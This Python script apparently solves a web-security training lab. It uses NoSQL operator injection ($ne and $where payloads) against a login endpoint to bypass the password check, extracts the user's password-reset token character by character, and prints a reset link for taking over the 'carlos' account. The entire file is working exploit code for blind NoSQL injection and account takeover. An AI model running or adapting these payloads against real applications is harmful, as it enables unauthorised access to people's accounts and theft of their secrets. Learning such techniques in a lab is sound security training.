import requests
from urllib.parse import urljoin
import string

def send_login(base_url, payload):
    url = urljoin(base_url, "/login")
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(url, json=payload, headers=headers)
        return response.text
    except Exception as e:
        print(f"[!] Request error: {e}")
        return ""

def test_ne_injection(base_url):
    payload = {"username": "carlos", "password": {"$ne": "invalid"}}
    response = send_login(base_url, payload)
    return "Account locked" in response

def test_where_clause(base_url):
    test_0 = {"username": "carlos", "password": {"$ne": "invalid"}, "$where": "0"}
    test_1 = {"username": "carlos", "password": {"$ne": "invalid"}, "$where": "1"}
    resp_0 = send_login(base_url, test_0)
    resp_1 = send_login(base_url, test_1)
    return "Invalid username" in resp_0 and "Account locked" in resp_1

def extract_token_value(base_url, token_field, max_length=40):
    print(f"[*] Extracting token value for field: {token_field}")
    token = ""
    for i in range(max_length):
        found = False
        for c in string.ascii_letters + string.digits + "-_":
            test = token + c
            payload = {
                "username": "carlos",
                "password": {"$ne": "invalid"},
                "$where": f"this.{token_field}.match('^{test}.*')"
            }
            response = send_login(base_url, payload)
            if "Account locked" in response:
                token += c
                print(f"[+] Token so far: {token}")
                found = True
                break
        if not found:
            break
    return token

def main():
    base_url = input("Enter Lab URL (e.g. https://YOUR-LAB-ID.web-security-academy.net): ").strip()
    if not base_url.startswith("http"):
        print("[-] Invalid URL format.")
        return

    print("[*] Testing for NoSQL Injection...")
    if not test_ne_injection(base_url):
        print("[-] Injection failed. Target may not be vulnerable.")
        return
    print("[+] $ne injection appears successful.")

    if not test_where_clause(base_url):
        print("[-] $where clause injection failed.")
        return
    print("[+] $where clause is being evaluated.")

    # Use known token field directly
    token_field = "newPwdTkn"

    token_value = extract_token_value(base_url, token_field)
    if not token_value:
        print("[!] Could not extract token value.")
        return

    reset_link = urljoin(base_url, f"/forgot-password?{token_field}={token_value}")
    print(f"\n🎯 Password reset link:\n{reset_link}")
    print("🚀 Paste it in Burp's browser, reset Carlos's password, and solve the lab.")

if __name__ == "__main__":
    main()
